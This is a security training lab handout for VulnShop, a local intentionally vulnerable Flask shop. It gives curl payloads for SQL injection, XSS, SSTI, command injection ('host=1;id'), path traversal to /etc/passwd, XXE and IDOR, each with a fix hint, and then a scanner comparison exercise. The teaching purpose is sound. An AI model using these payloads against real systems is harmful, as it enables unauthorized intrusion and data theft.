# VulnShop — Lab Exercise

> **Target:** [http://vulnshop:5000](http://vulnshop:5000) (or [http://127.0.0.1:5000](http://127.0.0.1:5000))
>
> ⚠️ This app has **real** vulnerabilities including RCE. Keep it on loopback (`127.0.0.1`). Never expose to the internet. Tear down after: `docker compose down -v`.

## Setup

```bash
cd /home/cystar/analyser/vulnshop
docker compose up -d
curl http://127.0.0.1:5000/health     # should return {"status":"ok"}
```

Verify you can open the site in your browser at `http://127.0.0.1:5000`.

---

## 1. Orientation (5 min)

Open the site and click around:

- **Home** — the storefront
- **Search** — try searching for "shirt"
- **Security Lab** (`/sitemap`) — lists every vulnerability with a form to test it
- **Admin** — check what's behind this link
- **robots.txt** (`/robots.txt`) — what does it hide?

**Note for later:** The `/sitemap` page is the quickest way to find and test every vulnerability. You'll also run a scanner (TraceON) later — compare what it finds against the list on this page.

---

## 2. Guided Vulnerability Walkthrough (35 min)

Each section follows the same pattern:

| Field | What it means |
|-------|---------------|
| **Endpoint** | The URL with the vulnerability |
| **What it is** | What kind of flaw |
| **Why it works** | The coding mistake (1 sentence) |
| **Try it (browser)** | Click or paste this URL directly |
| **Try it (curl)** | Copy-paste this terminal command |
| **Observe** | What to look for in the response |
| **Fix hint** | How to close the hole |

---

### 2.1 SQL Injection

| | |
|---|---|
| **Endpoint** | `GET /search?q=` |
| **What it is** | The search box trusts your input and builds a SQL query with it |
| **Why it works** | `q` is dropped directly into an f-string with no parameter binding |
| **Try it (browser)** | [http://127.0.0.1:5000/search?q=%27+OR+1%3D1--](http://127.0.0.1:5000/search?q=%27+OR+1%3D1--) |
| **Try it (curl)** | `curl "http://127.0.0.1:5000/search?q='+OR+1%3D1--"` |
| **Observe** | The search returns **every** product (12 rows) — the `OR 1=1` makes the condition always true |
| **Fix hint** | Use parameterized queries (`?` placeholders) instead of string formatting |

---

### 2.2 Reflected XSS

| | |
|---|---|
| **Endpoint** | `GET /greet?name=` |
| **What it is** | The name you provide is echoed back as HTML without escaping |
| **Why it works** | `render_template_string()` interprets the input as a template, not plain text |
| **Try it (browser)** | [http://127.0.0.1:5000/greet?name=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E](http://127.0.0.1:5000/greet?name=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E) |
| **Try it (curl)** | `curl "http://127.0.0.1:5000/greet?name=<script>alert('XSS')</script>"` |
| **Observe** | The script tag is rendered as executable JavaScript in the page |
| **Fix hint** | Never pass user input to `render_template_string`. Use `render_template()` with a static template file |

---

### 2.3 Server-Side Template Injection (SSTI)

| | |
|---|---|
| **Endpoint** | `GET /greet?name=` (same endpoint as XSS) |
| **What it is** | Jinja2 expressions inside `{{ }}` are evaluated on the server |
| **Why it works** | Same reason: user input becomes template source code |
| **Try it (browser)** | [http://127.0.0.1:5000/greet?name=%7B%7B7*7%7D%7D](http://127.0.0.1:5000/greet?name=%7B%7B7*7%7D%7D) |
| **Try it (curl)** | `curl "http://127.0.0.1:5000/greet?name={{7*7}}"` |
| **Observe** | The page shows **49** instead of `{{7*7}}` — the server computed the math |
| **Fix hint** | Same as XSS: never use `render_template_string` with user input. Use the template engine's auto-escaping from a file |

---

### 2.4 Command Injection

| | |
|---|---|
| **Endpoint** | `GET /api/ping?host=` |
| **What it is** | The "ping" endpoint passes your host value directly to a shell command |
| **Why it works** | The input goes into `sh -c "ping -c 3 {host}"` — a semicolon runs a second command |
| **Try it (browser)** | [http://127.0.0.1:5000/api/ping?host=1%3Bid](http://127.0.0.1:5000/api/ping?host=1%3Bid) |
| **Try it (curl)** | `curl "http://127.0.0.1:5000/api/ping?host=1;id"` |
| **Observe** | The response contains `uid=0(root)` — the `id` command ran on the server |
| **Fix hint** | Never use `shell=True` in subprocess calls. Use `shlex.quote()` or pass arguments as a list |

---

### 2.5 Path Traversal

| | |
|---|---|
| **Endpoint** | `GET /download?file=` |
| **What it is** | The file parameter joins to a directory but never checks for `..` |
| **Why it works** | `FILES_DIR / filename` lets `../` climb up the directory tree |
| **Try it (browser)** | [http://127.0.0.1:5000/download?file=..%2F..%2Fetc%2Fpasswd](http://127.0.0.1:5000/download?file=..%2F..%2Fetc%2Fpasswd) |
| **Try it (curl)** | `curl "http://127.0.0.1:5000/download?file=../../etc/passwd"` |
| **Observe** | The Unix password file (`/etc/passwd`) is returned in the response |
| **Fix hint** | Use `send_from_directory()` which rejects paths containing `..`. Always resolve then validate the full path |

---

### 2.6 Open Redirect

| | |
|---|---|
| **Endpoint** | `GET /redirect?url=` |
| **What it is** | The redirect endpoint doesn't check where it sends you |
| **Why it works** | Flask's `redirect()` accepts any URL — internal or external, no validation |
| **Try it (browser)** | [http://127.0.0.1:5000/redirect?url=https%3A%2F%2Fexample.com](http://127.0.0.1:5000/redirect?url=https%3A%2F%2Fexample.com) |
| **Try it (curl)** | `curl -v "http://127.0.0.1:5000/redirect?url=https://example.com"` |
| **Observe** | The response is a `302 Found` redirecting to `https://example.com` |
| **Fix hint** | Validate the `url` parameter against an allowlist of internal paths. Reject external URLs |

---

### 2.7 Exposed Secrets & Backups

| | |
|---|---|
| **Endpoint** | `GET /.env` , `GET /backup.zip` |
| **What it is** | Routes that serve fake secrets and archives — real apps expose these accidentally |
| **Why it works** | They are explicitly routed Flask endpoints accessible to anyone |
| **Try it (browser)** | [http://127.0.0.1:5000/.env](http://127.0.0.1:5000/.env) · [http://127.0.0.1:5000/backup.zip](http://127.0.0.1:5000/backup.zip) |
| **Try it (curl)** | `curl http://127.0.0.1:5000/.env` · `curl http://127.0.0.1:5000/backup.zip -o /dev/null -w "%{content_type}"` |
| **Observe** | `/.env` returns plaintext secrets (`SECRET_KEY`, `ADMIN_PASSWORD`, `API_KEY`). `/backup.zip` returns a zip archive |
| **Fix hint** | Never serve `.env` files or backups from the web root. Use reverse proxy rules to block hidden files |

---

### 2.8 Unauthenticated Admin Panel

| | |
|---|---|
| **Endpoint** | `GET /admin` |
| **What it is** | Admin dashboard with no login required |
| **Why it works** | The route has no authentication decorator — it queries the DB and renders directly |
| **Try it (browser)** | [http://127.0.0.1:5000/admin](http://127.0.0.1:5000/admin) |
| **Try it (curl)** | `curl http://127.0.0.1:5000/admin` |
| **Observe** | All 5 users are listed with their usernames, emails, and admin status |
| **Fix hint** | Add `@login_required` decorator. Check `session['is_admin']` before rendering sensitive data |

---

### 2.9 Passive Findings (Header & Cookie Issues)

#### 2.9a Missing Security Headers

| | |
|---|---|
| **What it is** | Every response lacks `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` |
| **Try it (curl)** | `curl -sI http://127.0.0.1:5000/` |
| **Observe** | The response has none of these headers |
| **Fix hint** | Add them via Flask middleware or a reverse proxy |

#### 2.9b Insecure Session Cookie

| | |
|---|---|
| **What it is** | After login, the session cookie is set without `Secure`, `HttpOnly`, or `SameSite` |
| **Try it (curl)** | `curl -v -d "username=admin&password=admin123" http://127.0.0.1:5000/login 2>&1 \| grep Set-Cookie` |
| **Observe** | `Set-Cookie: session=...; HttpOnly; Path=/` — notice no `Secure` or `SameSite` |
| **Fix hint** | Set `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SAMESITE='Lax'` in Flask config |

#### 2.9c Stack Trace Disclosure

| | |
|---|---|
| **Endpoint** | `GET /boom` |
| **What it is** | Intentional error that renders the full Python traceback in the response |
| **Try it (browser)** | [http://127.0.0.1:5000/boom](http://127.0.0.1:5000/boom) |
| **Try it (curl)** | `curl http://127.0.0.1:5000/boom` |
| **Observe** | A `RuntimeError` stack trace showing file paths, line numbers, and the error chain |
| **Fix hint** | Register a custom error handler that returns a generic error page without stack details in production |

---

### 2.10 IDOR — Insecure Direct Object Reference

| | |
|---|---|
| **Endpoint** | `GET /api/orders/<id>` |
| **What it is** | You can view any order without owning it |
| **Why it works** | The endpoint checks only that the order `id` exists — never that it belongs to you |
| **Try it (browser)** | Try these one by one: |
| | [http://127.0.0.1:5000/api/orders/1](http://127.0.0.1:5000/api/orders/1) — belongs to `admin` |
| | [http://127.0.0.1:5000/api/orders/2](http://127.0.0.1:5000/api/orders/2) — belongs to `admin` |
| | [http://127.0.0.1:5000/api/orders/3](http://127.0.0.1:5000/api/orders/3) — belongs to `alice` |
| | [http://127.0.0.1:5000/api/orders/4](http://127.0.0.1:5000/api/orders/4) — belongs to `alice` |
| | [http://127.0.0.1:5000/api/orders/5](http://127.0.0.1:5000/api/orders/5) — belongs to `bob` |
| | [http://127.0.0.1:5000/api/orders/6](http://127.0.0.1:5000/api/orders/6) — belongs to `bob` |
| | [http://127.0.0.1:5000/api/orders/7](http://127.0.0.1:5000/api/orders/7) — belongs to `charlie` |
| | [http://127.0.0.1:5000/api/orders/8](http://127.0.0.1:5000/api/orders/8) — belongs to `charlie` |
| | [http://127.0.0.1:5000/api/orders/9](http://127.0.0.1:5000/api/orders/9) — belongs to `diana` |
| | [http://127.0.0.1:5000/api/orders/10](http://127.0.0.1:5000/api/orders/10) — belongs to `diana` |
| **Try it (curl)** | `curl http://127.0.0.1:5000/api/orders/3` |
| **Observe** | Order 3 shows `"username": "alice"` — you see another user's order without logging in as them |
| **Fix hint** | Add an ownership check: compare `order.user_id` against `session['user_id']` after login |

---

### 2.11 XXE — XML External Entity

| | |
|---|---|
| **Endpoint** | `POST /api/import` |
| **What it is** | The XML parser trusts external entities inside the document |
| **Why it works** | `etree.XMLParser(resolve_entities=True)` expands entity references |
| **Try it (browser)** | Open the Security Lab (`/sitemap`) → XXE card has a form with pre-filled payload |
| **Try it (curl)** | `curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY x "xxe-works">]><root><item>&x;</item></root>' http://127.0.0.1:5000/api/import` |
| **Observe** | The response shows `{"imported": ["xxe-works"]}` — the entity was resolved server-side |
| **Fix hint** | Set `resolve_entities=False` (the default in modern lxml). Never process untrusted XML with entity resolution enabled |

---

## 3. TraceON Scan Lab (25 min)

Now you'll run the **TraceON security scanner** against VulnShop and compare its findings with what you just exploited manually.

### 3.1 Create the Scan

1. Open TraceON in your browser
2. Create a new **Project**
3. Set **Target URL** to: `http://vulnshop:5000`
4. Select **Profile:** `blackbox`
5. Set **Scan Depth:** `3`
6. Set **Max Children:** `10`
7. Leave **Path Fuzzing:** `off`
8. Leave **Server Audit:** `off`
9. Start the scan

### 3.2 While Scanning (don't wait idle)

Answer in your head:
- Which vulnerabilities do you expect TraceON to find automatically?
- Which ones will it miss? Why?

### 3.3 Analyze Results

When the scan finishes:

1. **Count the total findings.** Are there more than 2? (If fewer than 3, LLM synthesis is skipped — ask your instructor for help.)
2. **Map each finding** to the vulnerability you exploited in Section 2:

| Finding in TraceON | Maps to Section |
|---|---|
| SQL Injection | 2.1 |
| Reflected XSS | 2.2 |
| ... | (fill in yourself) |

3. **Check the list of discovered routes** on the scan page. Which endpoints did the spider find? Are any missing?

### 3.4 Compare Manual vs Scanner

| Vulnerability | Found Manually? | Found by TraceON? |
|---|---|---|
| SQL Injection | ✅ (Section 2.1) | |
| XSS | ✅ (2.2) | |
| SSTI | ✅ (2.3) | |
| Command Injection | ✅ (2.4) | |
| Path Traversal | ✅ (2.5) | |
| Open Redirect | ✅ (2.6) | |
| Exposed `.env` | ✅ (2.7) | |
| Exposed `/backup.zip` | ✅ (2.7) | |
| Unauth `/admin` | ✅ (2.8) | |
| Missing Headers | ✅ (2.9a) | |
| Insecure Cookie | ✅ (2.9b) | |
| Stack Trace | ✅ (2.9c) | |
| IDOR | ✅ (2.10) | |
| XXE | ✅ (2.11) | |

**Why does the scanner miss some?** Think about:
- Can a crawler know which order IDs belong to other users? (IDOR)
- Can a spider fill out and submit an XML POST form? (XXE)
- Can a scanner check if you should own a resource? (Authorization)

---

## 4. Reflection (10 min)

Discuss or journal your answers:

1. **Which vulnerability was easiest to exploit?** Why?
2. **Which vulnerability did TraceON find that surprised you?**
3. **Which vulnerability did TraceON miss that you expected it to find?**
4. **What's the single root cause** that most of these vulnerabilities share? (Hint: it involves trust)
5. **If you had to fix only 3 of these 15 vulnerabilities** to close the most risk, which 3 would you pick?

---

## 5. Teardown

```bash
cd /home/cystar/analyser/vulnshop
docker compose down -v
```

This removes the container and the SQLite database volume.

---

## Reference: All Endpoints

| Endpoint | Vulnerability | Type |
|---|---|---|
| `GET /search?q=` | SQL Injection | Web / Auto-detectable |
| `GET /greet?name=` | Reflected XSS | Web / Auto-detectable |
| `GET /greet?name=` | SSTI (Jinja2) | Web / Auto-detectable |
| `GET /api/ping?host=` | Command Injection | Web / Auto-detectable |
| `GET /download?file=` | Path Traversal | Web / Auto-detectable |
| `GET /redirect?url=` | Open Redirect | Web / Auto-detectable |
| `GET /.env` | Exposed Secrets | Exposure / Auto-detectable |
| `GET /backup.zip` | Exposed Backup | Exposure / Auto-detectable |
| `GET /admin` | Unauth Admin | Exposure / Auto-detectable |
| All responses | Missing Headers | Config / Passive |
| `POST /login` | Insecure Cookie | Config / Passive |
| `GET /boom` | Stack Trace | Config / Passive |
| `GET /api/orders/<id>` | IDOR | Business Logic / Manual |
| `POST /api/import` | XXE | Input Validation / Manual |
| `app.py` | Hardcoded Secrets | SAST / Code Review |
| Database | Plaintext Passwords | SAST / Code Review |